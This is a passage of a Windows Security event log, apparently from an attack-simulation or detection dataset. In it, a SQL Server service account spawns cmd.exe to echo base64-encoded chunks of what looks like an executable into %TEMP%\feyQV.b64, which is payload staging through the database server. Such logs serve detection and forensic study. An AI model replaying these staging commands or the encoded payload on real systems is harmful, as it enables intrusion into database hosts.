      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1184</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:10.819947900Z" />
      <EventRecordID>1331271</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x224</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo ixFSaMjQMgBQ/9aLTQyL6VK/W5MAAH3EEKHL0EAAO9l8Bz0gXAAAsS+LRQyLFcjAQABoIE5vAIPCQD8rUWig0EAAUqTWi0UMizis6CEtAAChGNBAAIPEFIsN9dBAADvBfivCVfaLDcjAfwCDwUA2sVBo5NBjAFH/1otVDIsCUOjtLAAAi28Q0EAAg8QROR0U0MAAdD6B+Zb5AAB+DxlnZmZm5NXB+o+ZysHpHwPRg72diRUU0EAAfSDHBRTQQABkAAAA/xTUN0UAAF9eM8Bbi+Vdw4kdFNBAAOgjLNAA/Q4RAACLFUxAQQBS6HI3AABfXgXAW4vlXcOQmxJAAHQSQADiE0AALhNAAIERQBtbEkAAOxZgAJr8QAAWEUAAAsVAAGJvQiZtEUAAThFAewgVQAAqP0AA6BBAAL8QQACMf0AAcudAABoSQAA9EjgAOxFAslkSfAB2FIwAhRRAAN8UQCXzFEAAFhVAAAAbARu3GxsuGxsbG6AbmQMbsQSFGwYbBxsbrRsbGxsbG4kJClYbDA0OGw8bqibqERKcGxQVFhcYGRqQkJCQkJCQkMSQkHKQWFXh7ItFCI1QyMBAAFCDwfxoadJAAFH/FYDBPgChrAJBAB7EBYXAdA9QaJrSQAD/FWTBQACDxAhqAf8VcMFAAJBVi+yB7LgAAEiheLlBToXAoUxAQQB0FGgxPJcAUP2eQAAAZosNdKxB50kUi7ReGEEAUlDoiEAAAGaLDfR3QQDpCBhBAKGIAkEAYO+LNWTBQOFmiQ1VC0EAhcCwdV2LFUoYCQBSIGi1QAD/1qV4AmgAg8QIhcB0FaF0AkEAUFdAmEEAaNhjQAD/hYNaDDvC0EAAhcBigNRAAHUF23wYQABQylLU/wD/1ovSyLpAAIPBIFH/FVTBQACDxAyLFRjQQADoNYfBQABojJEAAHgDTLuwC0EAjBAmQABqIFD/1ou8TEBBAFIVGNB6uYPEEIwuIEEAagBRmmj4F0HA6IFHAC6FwHT2UKdQKEAA6OIFAACDOAihfAJBAIXAyTWhrAtBABsNnAtB/YsVSBRBAGoAgZzRQABQoUxAQetRaEjUQABSUOi7iQAAgy0csEhAQQDrBUNIQEEAi6WAAkEAhcl1JosQTEBBANMAaJzRQEtoRNRAAGgr4EAAUFHohD8AXYPCGKNIQEEAiw2EAnoAhcl1HIsVTEBBAEgAxxjUGQB6UktePwARgy4Qo0gtQQCLx2AGQQC9yX8viydoAkEAvvzTQACF0nUFvtQCQQCLFXgCoQCF0osVQEBBAHUGixXkF0FnhWW5+NNAAHQFbG/TQABQRQQYuGRQoXRAQQBQmFJRiw0w0EAAaNTTBQBoAAgAAFFN3paSAIOnb+t9ihWJOEEAv0CBYAB20nBuv8jTQACLmmgCQQC+/NM1DYXSdQW+1AJBAIsVeAI9AIXSixVAQPIAdQaLFeQbqwCD+QG5wNNAAHQFubym&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:10.822381800Z" />
      <EventRecordID>1331272</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x12dc</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x224</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:11.094407400Z" />
      <EventRecordID>1331273</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xec4</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo QABQoXBPQQBXUOljGEEA2aFEcEEAUFZSUYuoMNAyAGh400AAaAII+wAa6J5vAACDxCw9AAgAAHINaAXTQADoAv3/44PEBKFYAkEAuwIAOgA7w1kpoWDgQQA7w7jQ00B5KvG4udMKAIsVJ/RAllJQBgLTQKv/FWjBQABGxAyLZTDQQACDyf8zwPKuoWACQQBZX0mD+AGJDewXUgB8cKFwAkEAjUxqAVH/FVzBQAClxASDwHUfpxXxwEAAaBTTMwCDwo9S/xWAwUAx1cQIKOK2i+Vdw4sVMNBAAIvwFEBCiA5GhMl1A6cV7BdBAA8NcAL2mos1IDhBAI08AovywekCb6WLyoPhsfOkozDQpgBXTEC8AGaLDbQLyQCLFQgYQQBQTQBRagBSk/wXvQDoDlQAAIvwZoW/dCyhCBhBAI2NSP///1Bo9NJAAFBeUeg+azAAD79xfatI/7z/UlDo7uAA4IPEGOimTgAAi/ChZAJBAIv6pTigC0EAhcCJPaQLQQCJNcDLQQCJhsR8QQB055lqemhA7ZEAUlDoXJkAAON5E9eJt+xAVfDrDsfz7P/////HRfD/5/9/aBcgWwBT/xUTwf4AoRjQQAAYZQgz9oXATTEz/6cNsAuzAIm0D1hT+QDLFbCtQRqNBBdQ6IAcAKOhGND/AIPEBFWBx2AIAABy8Hxmiw0YZkAAs1XoiU38iw0s0KYAjUX8UosVKNBAAFGh+AWzAFFSUOiDRwAAhWeKDlBo6NIkAAIUAgAAg8QIi0X8hcB1VWjU0kAAOhD7h/+DxATINvzHM/ScAAAAhcAPjrVTAG3HRcgAEwAAL034BkXoi3QBRIsmCIXJD4QoRgAAixKtKuFcAgr2wyN0cw/o3FYAAIPTBKtpUA/q5vEAAPbDBA9GsQAAAIN+EgEPhZ4AAACh/BdBAItO0VBR6I5LAACLDfgXQQCLVosy+I1FwFBRx0XEAQARCYlVzOgvRQAAG4X/dPYMVgRS6DFLAACLtcQCQTOhSQJBAEOLyEAB+QqJubEC+gCjuJGHAH4mixXIwEAJaLDSQACDXUDq4xWAwUBQD792UGiY0kAA6B/dAACDxBDHRggAAAAA62N/RggCACPcixWoAkEAQonYFAJBXkzoWQEAAIPEBIN+CAN1SYtOBCkBAAAAiU2MiYlF3KH4F0EAjS7QUlA0TfqJdeToTNWTAOs2ND24AkEAixXM+0EAMUKJPbhHQQCJlykCQQBW6Mo6APWDxASLRfKLVfiVTfxAg8LVO8GJRdaJVfgPtiIn//+LDbyKQQCLj03jNaGbAkEAfxt8DSkVRD5BABpN7Du1cww7BQ3QQACNjBK8//+LDRS1QACFyXQaUKHIpEAAg8BAFIDSQABQ/xWAwUCAg8QM64poeNJAAP8VWMFAhYPEBNaIAkEAhcDlDOjffWEAX15bi2ldw0gA6DECANluxARfXluL5V2nF5CQkJCQclWL7Lfs&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:11.096649300Z" />
      <EventRecordID>1331274</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x1134</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xec4</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:11.368282700Z" />
      <EventRecordID>1331275</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x274</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo eOOLdQxWjUWIaniEVuiJaAAAi00IwBXIwEAArFGDwkBorN5AAIz2FYCuQAChrAJBAIPEFGPAdMxQaNfS3fU6FaC9zgCDxAhW/xVwwWEAXpCQRJDMkA6Q2ZC8OVWL7IPsFNRWuXUIV4tGFIlFwehJGgAAS6ALMgCJFaQLQQDM2ItGD4XAzvp1QIsNBGoAagBR6JaLAADNnjgIAACJvjwIAABcRhgAAAC8ixVUF7MAiVZzUbeQQQCFwHQ7oXACQQDNygPIiU776wKfjjgIpDOhKNAXAIsV8tA8AI/Ii4Y8CAAAE8I7+A+P5QAAAHwIO/4Ph6YAAACL3hiLHTDQQACLRgSNY3UDKFEWUOitawAAhRIqM4PBC8TRPWj9CgB0Jz3ZSQoAdLmYV/0KAKUZPST9CgB0Ej2hw5MAtwsOsyMLABWlpgAANIuoCIsdoAJBAIv6pAJBAAPcg9cviR2gAkEAiT2kIEEAi1YYi042A9boyIlWGImCtg+F7Jr1/8dGCN0AAC/oNEoAZaOgC0EAiRWkC10AkFYEibFACAAAMw2kC0FyuAEAAAAsRfBm1EX0iY5ECAAAi+trF/YcjUXsiU74UOqJzvzGH0BHAF9eW/zlXcN04NReAP8VZMFAX1boahoAAIPECMZeW4vlXcOLHbwCQQBovNRAAEOJJLwCQQAxq2TBGOhW6EIaAACDxAhfXluL5V3DkJCQkJCQkJBVi+yz7LzGAACLRZmVwHSG9YsJqwAQoAtBMokVpAtBPusLixWkC0EAoaA4QQDTix1tC0EA/leLPfcLQd8r0u7XifvYiVXQizVkwUAA34/YaLSY2gC0+kHCQADdXdC01mgvOUEZaKjfQAD/1qEAGEEAUGhGoUAA/8QzyWaLDUzdQQAvaMvfQAD/1miA1EAAw9YcFcNeQQAGJJ7fQMxv1rut0kEAUGgc30AA/9bTP9RAAP/Wiw3r3EAAlFkA388A/9aLVeKLRdBSFGjY3roA/9aLDawCQQCDxJ1RaLzFQAD/1osVuALnAFJooN4RAP/WqbjOQQCDxBCFwHQkocwCQemLDR4C7wAqFX8C4QBQocQCQQBRUlBokt5AAETWg/ROi5K8AkEAUWhI3kAAlNah0AJBAIPECIXAdHYoaCzeLgD/1oDECKEzYUEAhcB0EXQVsAKZAFJoEN5AANBKG1MIoZQCQQCLDcICQf5QUWjo3UAA/2ShYAJBiYPXDBb4AXUXixWkAkEM9KACQQBSUMLIpEAA/96DxAyDPWACQS4CdRiLaKQCQQCLFaACQQBRBmio3UAA/9aDxAyhnOKWuosNmDxBAFBRE4QUQAD/1n1F0NwdMMJAiebEDN/g9sRED4tqAAAAoewC2wCFwA+Ed6YAAN0FKMJAANx10IPsCN1dgNsFrAJBANxNgN0chGhQ3UAA/9bbBRjQQACDQQTcaNDcDSDnQADarqwCQQBCHPJoJN1AAP+c3UWV3A0g&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:11.370717900Z" />
      <EventRecordID>1331276</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xd98</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x274</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:11.643325600Z" />
      <EventRecordID>1331277</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xe28</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo wrR1g8QERzWsAugA3RyLaCjfQAD/1t+/kAJBAIPEBNxNgD0NGMJA+N0cFGik3EAA/9YsYAJBAIOlDIXAflnfO6ACd3KDyQjcTYDcDRjCUgDdHCQQfNJAAP/Wi+TfAkFaBrmQWLRjoaQCQQCLPZR/QQDw0xPHiQzYiUXcgwAE323Y3E2A3A14wkCo3RxHaIAIQAD/D4PEDKGsAkEAT8APjocNAAAzyerP/yb///9/O8FTTcCJTcSJTciJTQmJKuCJ1OSJTeiJTSaJfbCJVUSJfVeJdclTvWD////zlY////+JfQaJVdSJjXD///+JjXQ2//+ETbiJDPKJjTb//9mJjWyR//+JTYCJsISJjXiE//+JjXz///+JNQCJTayJTYgLTYyJTZCJTZSSjosBAAD6WcgLQRll0vSDwRCJZfxVeQSLRbSLGVLHfA2RBTktJHIGtl2wiX20i0EMi1EIOUWkfA2LBRoPoFAGiSKg3EWkK9Mbx4u9ZFD//zv4YhaiCDmVe///KHIMiZVg//9EiYVk//81i3kJi1nPOX3UfBJ/CvOJ0Ds1i3/hcgaJXfeJ7dSLnXRIsP/UWV5/J3wPo038i51w//8jrHE72XcWh838i6aJnXD///+LWdmJnXT////rA89N/ItJCYtdvDvZfyB8DfuyX4tduOBJYDvZdxGLTfyLWQiJXbhhQgyJXbzrAyRO/DmFbP//738WfAg5lcf///9DDImVaP///4mFbP///zl9hH8YfOWLSfiLXYA72cUe/HcJJFnciX1fifyAi+SLXcAD2YtN/IldwItdxA1JBPrZLk38uyPUi13Ii0kIA9mLTfyJXch9XcyLSQxY2YtNEr7K71XoiV3MISSHiU3guPX8ntiLU/iJ3lOLXewD0Iuz9IlVsRPfg8EgSIld7IlN/IlFsw+Fe/5e/6GsAkGUmYva3FXEi/iLRcAcV1JQpSaQAACLTcyJVZ2LVchTV1FSiUX4jBGQAACpTbyJRZiLTeRTV1BRplW56PyZtTqJVcyLVewpRciLRbpTV1JQ6OeNADUTD8ChrAJBAIXAiVWQD46IAAAA322Yiw3IpkHr3V3Y321ejQIQi0usAkEA3Vvx32033V3o323A3V3R3YV45WH/3UWo3UX03UWQ92gI3UXYg8AgSdjp2cDvySPG3evfaODdReDY6dnAu8neYt0x2YnY4SVl6NnJNNjZwMDJ3sPd2N9o2Npl8NnA2Mnewt3YdbLdgJDdhIjdXfXrBtyFeP///6HYAkEAr/gBV9uNUP+JVfT/RfTY+dn63Z14////6xRS9XjH/3wAAAAAx4V8rAb/AADbAIP4Ad3Yy5ONSP+JTbHbRfjcfajZ+t1dqOsOtUWIAAAAAMcucoUAALGDsAF+E41Q2YlV9Nss9Nz9iNkx3V1x61nHRYgAAADvx0WMjgAAAIP4AX4sjUj/iU0829/04X2Q2Yr1FKvrDsdFYgAAAADH&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:11.645554900Z" />
      <EventRecordID>1331278</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x6e8</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xe28</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:11.917431900Z" />
      <EventRecordID>1331279</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xf18</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo RZQA/QAAixXIC0EAaCwwIwBqIFDH/zNEwUAAiz2sXEEAg0aNg/8BfkCLhCUBAACAeQV8g8j+QHQwi+iLHaAYQQCZmsIJANH4weBDA8NqAotIMItQEANTi1A0E1AU3VHoQY4AAIlF8Osbi8eLHWQLQQCZrcLR+MHgBYtMGBCJTf+LVBgUaBIxQAAfIDlTs5v0XBVEweEAlz2sAkE+g8oQg/8Bfk+LxyWOegCAeQWUg8j+QHQ/48eLHcjeQQCZKydqANH4E+AoA8NqAosePotQCSspi1A8G1A0K0gQG1AUA3hjxikcUlHoPI0AAIlF6IlVPus7i8eLPcgfQS+ZK8Iz+MHgBQPDi4cdi2pmA8qLS5WJTSOLSBx5yolN7HzAMUAAaiBXU4YVRMGv4YtArAJBAIP1EIP/AX5APcclAQAAgKgFtoPIS0B0MIvoix3IC3wAmSvCagDR+MFoBVjDagKLNyiLUAgDyItQLBNNDFJR6ICN2C6JReCiG6LHix3IC0EAmSsf3PjB4AWLTBgIiU3gi90YDGggMQgAaiBXU4kr5CQVRMFAdqGsAkEAQMQ3g/gBn0KLyI/hAQAAgDIFSYPJ/uF0MZkrp4scEQtBANH4weDdA8JqAGoCKEg4i1iE91A8i3gceKET11JR6LeMAACL04va6xeZVMJbyP66C0EA0fnB2gWLfgEYi1wBHNY43EAA/9aLG7CLTbSDxAQF9AEAAIPRjmoAaOjNAABRUOx0jMcAi02kiUWwi0WgagAF9AG8AGgMAwAAg9EAiVW0UVDoJy0AAItN/IlFQYtF+GoABfQBAACQ6AOQAIPRAO9VeFFQ6DAvAMSLTcyJRfiLRcNqAI/aAQAAaOgDAACD0QCJVfxRYZgOjF+Ni+PEiUW+i0XAao5M9AEAAGjoAwAAgywArFXMUVDo7IsAADN9nIlfwItFQ8YABfQBAABoZlZwAIPRAIlVxFFQ6MrBAACLwvSJRZiLBvDf+Wb0AQAAaOgDAACP0QCJVZxRULKoiwAAiTnwi0XoiVX0i03sBVwDqQCD0QBqAGjoAwAAUVDohvoAAItN5Ikt6ItF4GoABfTZAABoXANoAIPRGIlV7HJQ6L2LAACBx/QBAADEAINvAGjbAy8AU1euROCJ8U/oR4sAAJqNdP///4lF2IuFcFH//zgABfQBAACyyQMAtXsUzIlV3FFQ6B+LAACLTbzUim5FuGoABc8BAABf6AMAAIPeD6v2UVCL74oAad1FqNwNEBv8AIlFuEYg0EALXMDdXajdRYjcDRDCQACynrzdXYjdRZDc6xDCQJvdXZB3hXj///80DYDCQABGnfNY//8PhGQCAABoCNxAAP/Wi1X0e0Vuna1l/ldmi8moUItF/FGLTfhSsFVXUIuhsFGCUGjY20AA/9aLzWhprlDljWz///8sxDAF9KUAAIPRAGoAaOgDfgBRUNlhigAAi03sIYtV6FCLRWUbhE2I&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:11.919643000Z" />
      <EventRecordID>1331280</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xbf4</Data>
